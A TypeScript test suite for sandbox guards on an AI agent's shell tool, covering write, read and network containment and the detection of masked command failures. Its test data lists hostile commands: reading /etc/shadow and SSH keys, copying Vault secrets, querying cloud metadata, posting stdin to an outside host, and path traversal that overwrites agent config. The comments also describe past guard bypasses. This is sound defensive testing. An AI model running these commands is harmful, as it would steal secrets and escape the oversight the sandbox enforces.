import { describe, expect, it } from 'vitest';
import path from 'node:path';
import {
  boundCommandOutput,
  COMMAND_OUTPUT_HEAD_CHARS,
  COMMAND_OUTPUT_TAIL_CHARS,
  CRITICAL_ERROR_PATTERNS,
  TEST_GATE_FAILURE_PATTERNS,
  detectReadPathViolations,
  detectShellNetworkViolations,
  detectWritePathViolations,
  extractWriteTargets,
  grepNoMatchHint,
  isLikelyBuildCommand,
  standardSupervisorSignals,
} from '../../src/agents/common/tool/handlers/runCommand';

describe('extractWriteTargets', () => {
  it('extracts a simple `> file` redirect target', () => {
    expect(extractWriteTargets('echo hi > codebase/log.txt')).toContain('codebase/log.txt');
  });

  it('extracts `mkdir -p` targets', () => {
    expect(extractWriteTargets('mkdir -p codebase/build codebase/dist')).toEqual(
      expect.arrayContaining(['codebase/build', 'codebase/dist']),
    );
  });

  it('does NOT extract `{` from JS arrow-function body inside `node -e`', () => {
    // Regression: log idx 163 — false positive `Violations: "{" → resolves to "{"`
    const cmd = `node -e "(async () => { const fetchOpts = { redirect: 'manual' }; for (const p of ['/','/sign-in']) { console.log(p); } })()"`;
    const targets = extractWriteTargets(cmd);
    expect(targets).not.toContain('{');
    // The command has no real redirect target, so nothing legitimate is captured either
    expect(targets).toEqual([]);
  });

  it('does NOT extract pseudo-targets from quoted strings', () => {
    expect(extractWriteTargets(`echo "hello > /etc/passwd" > codebase/log.txt`)).toEqual([
      'codebase/log.txt',
    ]);
  });

  it('extracts `cp` last argument as destination', () => {
    expect(extractWriteTargets('cp -r codebase/src codebase/backup')).toContain(
      'codebase/backup',
    );
  });

  // zinc-bracing-gavel: quoted paths with spaces/Korean were masked into bare
  // `"` tokens, producing garbage `Violations: - """` on legitimate copies.
  it('extracts the real destination from a double-quoted cp with spaces and Korean', () => {
    const cmd = 'cp "visual/ui/handoff/스크린샷 2026-08-21 오후 11.28.03.png" codebase/images/screenshot-1.png';
    expect(extractWriteTargets(cmd)).toEqual(['codebase/images/screenshot-1.png']);
  });

  it('extracts a quoted destination itself as its unquoted value', () => {
    const cmd = 'cp source.png "codebase/images/한글 이름.png"';
    expect(extractWriteTargets(cmd)).toEqual(['codebase/images/한글 이름.png']);
  });

  it('extracts quoted mkdir/touch/mv targets with spaces', () => {
    expect(extractWriteTargets('mkdir -p "codebase/my dir"')).toEqual(['codebase/my dir']);
    expect(extractWriteTargets('touch "codebase/a b.txt"')).toEqual(['codebase/a b.txt']);
    expect(extractWriteTargets('mv "old name.txt" "codebase/new name.txt"')).toEqual(['codebase/new name.txt']);
  });

  it('extracts a quoted redirect target (previous false negative)', () => {
    expect(extractWriteTargets('echo hi > "codebase/out dir/log.txt"')).toEqual(['codebase/out dir/log.txt']);
  });

  it('does NOT treat fd duplication (`2>&1`) as a write target', () => {
    expect(extractWriteTargets('npm run build > codebase/build.log 2>&1')).toEqual(['codebase/build.log']);
  });
});

describe('detectWritePathViolations', () => {
  const project = '/srv/workspace';
  const workingDir = '/srv/workspace/codebase';

  it('reports `/tmp/...` redirect as escape', () => {
    const v = detectWritePathViolations(
      'npm run dev > /tmp/dev.log 2>&1',
      workingDir,
      project,
    );
    expect(v.length).toBeGreaterThan(0);
    expect(v[0].reason).toMatch(/escape|outside/i);
  });

  it('does NOT flag `node -e` arrow-function as a violation', () => {
    const cmd = `node -e "(async () => { console.log('hi') })()"`;
    expect(detectWritePathViolations(cmd, workingDir, project)).toEqual([]);
  });

  it('flags `.git` writes', () => {
    const v = detectWritePathViolations(
      'echo break > codebase/.git/config',
      workingDir,
      project,
    );
    expect(v.length).toBeGreaterThan(0);
    expect(v[0].reason).toMatch(/\.git/);
  });

  it('allows a quoted-space Korean cp into codebase/ (zinc-bracing-gavel)', () => {
    // Default workingDir is the feature root (no working_directory arg).
    const cmd = 'cp "visual/ui/handoff/스크린샷 2026-08-21 오후 11.28.03.png" codebase/images/screenshot-1.png && cp "visual/ui/handoff/스크린샷 2026-08-21 오후 11.33.05.png" codebase/images/screenshot-2.png && echo "copy done"';
    expect(detectWritePathViolations(cmd, project, project)).toEqual([]);
  });

  it('still rejects a quoted destination outside codebase/', () => {
    const v = detectWritePathViolations('cp a.txt "/etc/target file"', workingDir, project);
    expect(v.length).toBeGreaterThan(0);
    expect(v[0].reason).toMatch(/escape|outside/i);
  });

  it('rejects double-quoted shell expansions as write targets (fail-closed)', () => {
    const v = detectWritePathViolations('cp a.txt "$HOME/evil.txt"', workingDir, project);
    expect(v.length).toBeGreaterThan(0);
    expect(v[0].reason).toMatch(/expansion/);
  });

  // Two independent axes. Containment holds everywhere — the spawned shell
  // never goes through FileSystemAdapter, so nothing else bounds it. The
  // codebase/ prefix rule is canonical-plane only; a universal artifact tree
  // has no such subtree. Gating both together let `cp x ../../../.ant/agents/…`
  // walk out of a universal job's sandbox.
  describe('containment holds on the universal plane, the codebase/ rule does not', () => {
    const artifacts = '/srv/workspace/universal/artifacts';

    it.each([
      ['../ traversal out of the sandbox', 'cp payload.txt ../../../.ant/agents/ops/agent.yaml'],
      ['absolute path outside the sandbox', 'cp payload.txt /srv/workspace/.ant/agents/ops/agent.yaml'],
      ['a .git write', 'echo break > .git/config'],
      ['an unverifiable expansion', 'cp a.txt "$HOME/evil.txt"'],
    ])('refuses %s', (_name, cmd) => {
      expect(detectWritePathViolations(cmd, artifacts, artifacts, false).length).toBeGreaterThan(0);
    });

    it('admits an ordinary write inside the artifact tree — no codebase/ prefix demanded', () => {
      expect(detectWritePathViolations('echo hi > notes/today.md', artifacts, artifacts, false)).toEqual([]);
      expect(detectWritePathViolations('mkdir -p reports', artifacts, artifacts, false)).toEqual([]);
    });

    it('the same write outside codebase/ is still refused on a canonical root', () => {
      const v = detectWritePathViolations('echo hi > notes/today.md', project, project, true);
      expect(v.length).toBeGreaterThan(0);
      expect(v[0].reason).toMatch(/outside codebase\//);
    });

    it('a path merely starting with ".." is not an escape', () => {
      expect(detectWritePathViolations('echo hi > ..hidden.md', artifacts, artifacts, false)).toEqual([]);
    });
  });
});

// The 2026-09 secret-copy report: the write guard checked only where bytes
// LAND, so `cp /vault/secrets/set-env.sh <artifacts>/test` succeeded and moved
// a Vault-injected file into the user-visible sandbox. Reads are contained to
// the same root — sources of cp/mv included.
describe('detectReadPathViolations — reads are contained to the sandbox root', () => {
  const artifacts = '/mnt/workspaces/individual/u@x.io/test/universal/artifacts';
  const project = '/srv/workspace';

  it.each([
    ['the reported cp of a Vault secret', `cp -rap /vault/secrets/set-env.sh ${artifacts}/test`],
    ['cp with a relative destination', 'cp /vault/secrets/set-env.sh .'],
    ['mv source outside', 'mv /etc/hosts ./hosts.bak'],
    ['cat of a host file', 'cat /etc/passwd'],
    ['cat of process memory', 'cat /proc/1/environ'],
    ['a sibling tenant via ../', 'cp ../../../other-tenant/f .'],
    ['an absolute sibling tenant path', 'cat /mnt/workspaces/individual/other@x.io/test/universal/artifacts/notes.md'],
    ['ls of a host directory', 'ls -la /vault'],
    ['head/tail/wc/stat/file/du/od/xxd/base64', 'head -c 100 /etc/shadow; tail -n 5 /var/log/syslog; wc -l /etc/group; stat /proc/self; file /usr/bin/node; du -sh /; od -c /etc/hostname; xxd /etc/machine-id; base64 /vault/x'],
    ['find rooted outside', 'find / -name "*.pem" -maxdepth 3'],
    ['grep with a host file as its FILE arg (pattern skipped)', 'grep -rn password /etc'],
    ['sed reading a host file', "sed -n '1,5p' /etc/passwd"],
    ['awk reading a host file', "awk -F: '{print $1}' /etc/passwd"],
    ['tar archiving a host directory via -C', 'tar -C /vault -czf out.tgz .'],
    ['tar reading a host archive via -f cluster', 'tar -tzf /var/backups/x.tgz'],
    ['input redirect from a host file', 'node script.js < /etc/passwd'],
    ['attached input redirect', 'wc -l </etc/passwd'],
    ['cd out, then a relative read', 'cd /etc && cat passwd'],
    ['a bare cd (home)', 'cd && ls'],
    ['a tilde path', 'cat ~/.ssh/id_rsa'],
    ['a quoted host path', 'cat "/vault/secrets/set env.sh"'],
    ['diff against a host file', 'diff notes.md /etc/motd'],
    ['jq over a host file (filter skipped)', "jq '.a' /vault/secrets/cfg.json"],
  ])('refuses %s', (_name, cmd) => {
    const v = detectReadPathViolations(cmd, artifacts, artifacts);
    expect(v.length, cmd).toBeGreaterThan(0);
    expect(v[0].reason).toMatch(/outside|home directory/);
  });

  it.each([
    ['a relative read inside', 'cat ./notes.md'],
    ['an absolute read inside', `cat ${artifacts}/notes.md`],
    ['cp inside → inside', 'cp reports/a.md reports/b.md'],
    ['ls with no path', 'ls -alrt'],
    ['pwd', 'pwd'],
    ['grep whose PATTERN looks like an absolute path', 'grep -rn "/api/users" src/'],
    ['grep -e pattern then a file', 'grep -e /vault notes.md'],
    ['sed whose script has slashes', "sed -n '/vault/p' notes.md"],
    ['awk program only', "awk '{print $1}' notes.md"],
    ['jq filter with a rooted-looking key', `jq '.["/x"]' data.json`],
    ['find rooted inside with predicates', 'find . -name "*.ts" -not -path "*/node_modules/*" -exec wc -l {} +'],
    ['tar extracting inside', 'tar -xzf assets.tgz -C assets'],
    ['a read loop over an expansion', 'for f in *.md; do cat "$f"; done'],
    ['an unquoted expansion', 'cat $FILE'],
    ['/dev/null input', 'node x.js < /dev/null'],
    ['head -n value that is not a path', 'head -n 20 notes.md'],
    ['cd into a subdir then relative reads', 'cd reports && cat a.md && cd .. && ls'],
    ['cp of a relative source into the tree', 'cp "visual/ui/handoff/스크린샷 2026-08-21.png" codebase/images/s.png'],
    ['a path merely starting with ..', 'cat ..hidden.md'],
    ['piped reads inside', 'cat notes.md | grep -n TODO | head -5'],
    ['echo mentioning cat (not a verb)', 'echo "cat /etc/passwd would be bad"'],
    ['a heredoc body mentioning host paths', "cat <<'EOF' > notes.md\n/vault/secrets\nEOF"],
    ['a stdout redirect (write axis, not read)', 'ls > listing.txt'],
    ['stdin marker', 'cat - < notes.md'],
    ['a python one-liner (guardrail scope: not a read verb)', `python3 -c "print('/etc')"`],
  ])('admits %s', (_name, cmd) => {
    expect(detectReadPathViolations(cmd, artifacts, artifacts), cmd).toEqual([]);
  });

  it('holds on a canonical feature root as well (workingDir = codebase/)', () => {
    expect(detectReadPathViolations('cat ../architecture/spec.md', `${project}/codebase`, project)).toEqual([]);
    expect(detectReadPathViolations('cat ../../etc/passwd', `${project}/codebase`, project).length).toBeGreaterThan(0);
  });

  it('treats an NFD-spelled root and an NFC-spelled path as the same tree', () => {
    const nfdRoot = '/ws/한글/artifacts'; // 한글 (decomposed)
    const nfcPath = '/ws/한글/artifacts/notes.md'; // 한글 (composed)
    expect(detectReadPathViolations(`cat ${nfcPath}`, nfdRoot, nfdRoot)).toEqual([]);
  });
});

// N1: shell curl/wget bypassed the loopback rule http_request enforces for
// its own URLs — SSRF into the pod network, cloud metadata, the data plane.
describe('detectShellNetworkViolations — shell egress is loopback only', () => {
  it.each([
    ['a public https URL', 'curl -fsSL https://example.com/install.sh'],
    ['a scheme-less public host', 'curl example.com/api'],
    ['cloud metadata', 'curl http://169.254.169.254/latest/meta-data/iam/'],
    ['a private-range host', 'wget http://10.0.0.5:6379/'],
    ['a redis data-plane host by name', 'curl http://redis:6379/'],
    ['--url form', 'curl --url https://example.com'],
    ['--url=form', 'curl --url=https://example.com'],
    ['a file: scheme', 'curl file:///etc/passwd'],
    ['a proxy flag', 'curl -x http://proxy:3128 http://localhost:3000/'],
    ['--resolve rerouting a loopback name', 'curl --resolve localhost:3000:93.184.216.34 http://localhost:3000/'],
    ['--connect-to', 'curl --connect-to localhost:3000:example.com:443 http://localhost:3000/'],
    ['a curl config file', 'curl -K urls.txt'],
    ['wget -e (proxy via execute)', 'wget -e use_proxy=yes -e http_proxy=1.2.3.4:80 http://localhost:3000/'],
    ['wget -i url list', 'wget -i urls.txt'],
    ['an expansion in the HOST', 'curl "http://$HOST:3000/health"'],
    ['a public URL after a loopback one in the same segment', 'curl http://localhost:3000/a https://example.com/b'],
    ['a public URL in a later pipe segment', 'echo x | curl -d @- https://example.com/collect'],
    ['a public URL behind timeout', 'timeout 10 curl https://example.com'],
  ])('refuses %s', (_name, cmd) => {
    const v = detectShellNetworkViolations(cmd);
    expect(v.length, cmd).toBeGreaterThan(0);
  });

  it.each([
    ['localhost with a path', 'curl -s http://localhost:3000/api/health'],
    ['127.0.0.1', 'curl -fsS http://127.0.0.1:3000/'],
    ['IPv6 loopback', 'curl http://[::1]:3000/'],
    ['0.0.0.0 bind address', 'curl http://0.0.0.0:8080/'],
    ['scheme-less localhost:port', 'curl localhost:3000/health'],
    ['a variable PORT with a literal host', 'curl "http://localhost:$PORT/health"'],
    ['headers/data/output/method flags with values', `curl -X POST -H "Content-Type: application/json" -d '{"a":1}' -o out.json -w "%{http_code}" http://localhost:3000/api`],
    ['long value flags without =', 'curl --header "Accept: text/html" --output page.html --max-time 5 http://localhost:3000/'],
    ['a short cluster ending in a value flag', 'curl -sSo /dev/null http://localhost:3000/'],
    ['-L following (loopback start)', 'curl -L http://localhost:3000/redirect'],
    ['wget to loopback with output flags', 'wget -q -O page.html -T 5 http://127.0.0.1:3000/'],
    ['curl in a retry loop', 'for i in 1 2 3; do curl -s http://localhost:3000/ready && break; sleep 1; done'],
    ['a non-network command that mentions a URL', 'echo "see https://example.com"'],
    ['curl reading stdin with no URL (nothing to judge)', 'curl -s -d @- http://localhost:3000/ < body.json'],
  ])('admits %s', (_name, cmd) => {
    expect(detectShellNetworkViolations(cmd), cmd).toEqual([]);
  });

  it('names the host in the reason so the model can re-plan onto a tool', () => {
    const v = detectShellNetworkViolations('curl https://example.com');
    expect(v[0].path).toBe('https://example.com');
    expect(v[0].reason).toMatch(/example\.com/);
    expect(v[0].reason).toMatch(/loopback/);
  });
});

describe('isLikelyBuildCommand', () => {
  for (const cmd of [
    'npm run build',
    'pnpm build',
    'pnpm run build',
    'yarn build',
    'next build',
    'vite build',
    'tsc -p tsconfig.build.json',
    'tsc --build',
    'tsc',
    'vitest run',
    'jest',
    'playwright test',
    'go build ./...',
    'cargo build',
    'turbo run build',
    'npm test',
    'pnpm test',
    'npm run typecheck',
  ]) {
    it(`recognises: ${cmd}`, () => {
      expect(isLikelyBuildCommand(cmd)).toBe(true);
    });
  }

  for (const cmd of [
    'npm run dev',
    'next dev',
    'vite',
    'cargo run',
    'echo hi',
    'ls',
  ]) {
    it(`does NOT match: ${cmd}`, () => {
      expect(isLikelyBuildCommand(cmd)).toBe(false);
    });
  }
});

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Exit-0 honesty backstop (ember-hauling-glade RCA): POSIX sh has no
// pipefail, so `failing-cmd | head` exits 0 — the sniffer must flag the
// masked failure from output alone, including the POSIX sh error grammar.
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
describe('CRITICAL_ERROR_PATTERNS — exit-0 false-success sniffer', () => {
  const flags = (output: string): string[] =>
    CRITICAL_ERROR_PATTERNS.filter(({ pattern }) => pattern.test(output)).map(({ label }) => label);

  const flagged: Array<[string, string]> = [
    // dash (cloud sh): the exact line this session returned with ✅ Exit 0
    ['sh: 1: ./node_modules/.bin/tsc: not found', 'command not found (sh)'],
    ['sh: line 3: pnpm: not found', 'command not found (shell)'],
    ['bash: tsc: command not found', 'command not found'],
    ['npm error code EACCES\nnpm error syscall mkdir\nnpm error path /root/.npm/_cacache/tmp', 'npm error'],
  ];
  for (const [output, label] of flagged) {
    it(`flags: ${JSON.stringify(output.slice(0, 60))}`, () => {
      expect(flags(output)).toContain(label);
    });
  }

  const clean: string[] = [
    // incidental "not found" prose must NOT flag (grep/test output)
    'user profile: not found in cache, regenerating',
    '✓ tests/routes.test.ts — asserts 404 body "route not found"',
    // npm warn is not npm error
    'npm warn deprecated lodash@4.17.20',
    'Progress: resolved 827, reused 827, downloaded 0, added 676',
  ];
  for (const output of clean) {
    it(`stays clean: ${JSON.stringify(output.slice(0, 60))}`, () => {
      expect(flags(output)).toEqual([]);
    });
  }
});

// vast-fusing-lemon: `vitest run … | tail -80` exited 0 on dash with 3 failed
// tests — the generic sniffer has no test-runner grammar, so the failure read
// as a clean ✅ gate pass. These rows apply only when `verifies === 'test'`.
describe('TEST_GATE_FAILURE_PATTERNS — tail-masked test failures', () => {
  const flags = (output: string): string[] =>
    TEST_GATE_FAILURE_PATTERNS.filter(({ pattern }) => pattern.test(output)).map(({ label }) => label);

  const flagged: Array<[string, string]> = [
    // vitest summary (colors stripped): only printed when failures exist
    ['Tests  3 failed | 8743 passed (8746)', 'test failures in runner summary'],
    // jest summary
    ['Tests:       2 failed, 14 passed, 16 total', 'test failures in runner summary'],
    // per-file FAIL marker
    ['FAIL tests/store/stoppedJobRestore.test.ts', 'failing test file'],
  ];
  for (const [output, label] of flagged) {
    it(`flags: ${JSON.stringify(output.slice(0, 60))}`, () => {
      expect(flags(output)).toContain(label);
    });
  }

  const clean: string[] = [
    // fully green runs never print a failed count
    'Test Files  123 passed (123)\nTests  1393 passed (1393)',
    // "0 failed" must not flag (defensive — some runners print it)
    'Tests: 0 failed, 5 passed, 5 total',
    // prose mentioning "failed" without a count
    'the previous attempt failed because of a typo',
  ];
  for (const output of clean) {
    it(`stays clean: ${JSON.stringify(output.slice(0, 60))}`, () => {
      expect(flags(output)).toEqual([]);
    });
  }
});

// vast-fusing-lemon: expected-negative grep gates (`grep pattern file` → want
// 0 matches) read as opaque ❌ failures with no output because `set -e` kills
// the trailing `; echo $?` diagnostic. The hint names the semantics.
describe('grepNoMatchHint — expected-negative grep gates', () => {
  it('hints on grep exit 1', () => {
    const hint = grepNoMatchHint("grep -n 'startJob' orchestrator.ts; echo \"EXIT: $?\"", 1);
    expect(hint).toMatch(/ZERO MATCHES/);
    expect(hint).toMatch(/set -e/);
  });

  it('hints on rg exit 1', () => {
    expect(grepNoMatchHint('rg -n pattern file.ts', 1)).toMatch(/ZERO MATCHES/);
  });

  it('stays silent on grep exit 2 (real error) and on non-grep commands', () => {
    expect(grepNoMatchHint('grep -n pattern file.ts', 2)).toBe('');
    expect(grepNoMatchHint('pnpm test', 1)).toBe('');
  });
});

// vast-fusing-lemon: `pnpm test:cli` was reaped mid-run because test output
// (Redis connection logs) matched the server-start signature. Test commands
// drop serverStartedPattern; everything else keeps the full default set.
describe('standardSupervisorSignals — serverStartedPattern excluded for test gates', () => {
  for (const cmd of ['pnpm test:cli', 'pnpm test', 'vitest run tests/', 'npm test', 'jest']) {
    it(`test command drops serverStartedPattern: ${cmd}`, () => {
      const signals = standardSupervisorSignals(cmd);
      expect(signals).toBeDefined();
      expect(signals).not.toContain('serverStartedPattern');
      expect(signals).toContain('hardTimeout');
    });
  }

  for (const cmd of ['pnpm dev', 'next dev', 'node server.js', 'pnpm build']) {
    it(`non-test command keeps the default set: ${cmd}`, () => {
      expect(standardSupervisorSignals(cmd)).toBeUndefined();
    });
  }
});

describe('boundCommandOutput — head+tail bound for the fact report', () => {
  it('returns short output unchanged', () => {
    expect(boundCommandOutput('all tests passed')).toBe('all tests passed');
  });

  it('preserves the head (compiler root error) and the tail (test summary) of a huge output', () => {
    const head = 'src/a.ts(1,1): error TS2304: root cause\n';
    const tail = '\nTests  3 failed | 120 passed';
    const raw = head + 'noise '.repeat(10_000) + tail;
    const bounded = boundCommandOutput(raw);
    expect(bounded.startsWith(head)).toBe(true);
    expect(bounded.endsWith(tail)).toBe(true);
    expect(bounded).toContain('chars elided');
    expect(bounded.length).toBeLessThan(COMMAND_OUTPUT_HEAD_CHARS + COMMAND_OUTPUT_TAIL_CHARS + 300);
  });

  it('never grows a payload near the limit (headroom guard)', () => {
    const raw = 'y'.repeat(COMMAND_OUTPUT_HEAD_CHARS + COMMAND_OUTPUT_TAIL_CHARS + 100);
    expect(boundCommandOutput(raw)).toBe(raw);
  });
});
